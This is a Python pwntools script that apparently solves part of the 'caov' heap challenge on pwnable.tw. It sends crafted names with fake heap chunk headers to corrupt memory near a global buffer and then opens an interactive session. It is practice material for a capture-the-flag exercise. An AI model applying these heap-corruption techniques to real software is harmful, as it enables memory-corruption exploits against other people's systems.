#coding:utf-8
from pwn import *
# import pwn_framework as pf
from time import sleep

global io
ru = lambda p, x : p.recvuntil(x)
sn = lambda p, x : p.send(x)
rl = lambda p  : p.recvline()
sl = lambda p, x : p.sendline(x)
rv = lambda p, x=1024 : p.recv(numb = x)
sa = lambda p, a, b : p.sendafter(a,b)
sla = lambda p, a, b : p.sendlineafter(a,b)
rr = lambda p, t : p.recvrepeat(t)

# amd64 or x86
context(arch = 'amd64', os = 'linux', endian = 'little')
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h', '-p', '75']

filename = "./caov"
ip = "chall.pwnable.tw"
port = 10306

LOCAL = True if len(sys.argv)==1 else False

global bps # Break Points
global gds # Gdb Debug Symbols
bps = []
gds = {}

elf = ELF(filename)

remote_libc = "./libc_64.so.6"
if LOCAL:
    # io = process(filename, env={'LD_PRELOAD': remote_libc})
    # io = gdb.debug(filename, "set  follow-fork-mode child\nb free\nc", )
    # io = gdb.debug(filename, "set  follow-fork-mode child\nset exec-wrapper env 'LD_PRELOAD=./libc_2.27.so'\nb *0x555555554ECA\n", )
    # libc = ELF("/home/pu1p/glibcs/glibc-2.27_out/lib/libc-2.27.so")
    libc = elf.libc

    # # if LD_PRELOAD multiple libs, split with ':'
    io = process(filename) 
    # libc = ELF(remote_libc)
else:
    context.log_level = 'debug'
    io = remote(ip, port)
    libc = ELF(remote_libc)
    # libc = elf.libc

def mydebug(p, s=''):
    def _get_bstr():
        global bps
        b_str =""
        for break_point in bps:
            if type(break_point) == int:
                b_str += "b *%s\n"%(hex(break_point))
            elif type(break_point) == str:
                b_str += "b %s\n"%(break_point)
            else:
                pause(p, "[_get_bstr] unsupported break point type : "+str(break_point))
        return b_str
    def _get_gds_str():
        global gds
        res = ""
        for name in gds:
            val = gds[name]
            if type(name) != str:
                pause(p, "[_get_gds_str] unsupported name type : "+str(type(name)))
            if type(val) != int:
                pause(p, "[_get_gds_str] unsupported val type : "+str(type(val)))
            res += "set $%s=%d\n"%(name, gds[name])
        return res
    if not LOCAL:
        return
    gdb.attach(p, _get_bstr()+_get_gds_str()+s)

def pause(p, s = 'pause'):
    if LOCAL:
        print('pid: ' + str(p.pid))
        return raw_input(s)
    else:
        return raw_input(s)

def choice(p, idx):
    sla(p, "Your choice: ", str(idx))

def lg(name, val):
    log.info(name+" : "+hex(val))


def show(io,):
    choice(io, 1)

def edit(io, name, length, key, value):
    choice(io, 2)
    sla(io, "Enter your name: ", name)
    sla(io, "New key length: ", str(length))
    sla(io, "Key: ", key)
    sla(io, "Value: ", str(value))


bps.append("*0x401A6A")
 
gds['name']=0x6032C0

mydebug(io, ) 

sla(io, "Enter your name: ", b'a'*8)
sla(io, "Please input a key: ", b'\x00'*0x37)
sla(io, "Please input a value: ", str(1))

target = 0x6032C0 + 0x10

pay = p64(0) + p64(0x21) + p64(0)*3 + p64(0x41) + b'c'*0x30 + p64(target)


edit(io, pay, 0x17, b'd'*0x17, 1)



pay = p64(0) + p64(0x41) + p64(0)*7 + p64(0x21) + b'c'*0x10 + p64(target)

choice(io, 2)
sla(io, "Enter your name: ", pay)
sla(io, "New key length: ", str(0))



io.interactive()
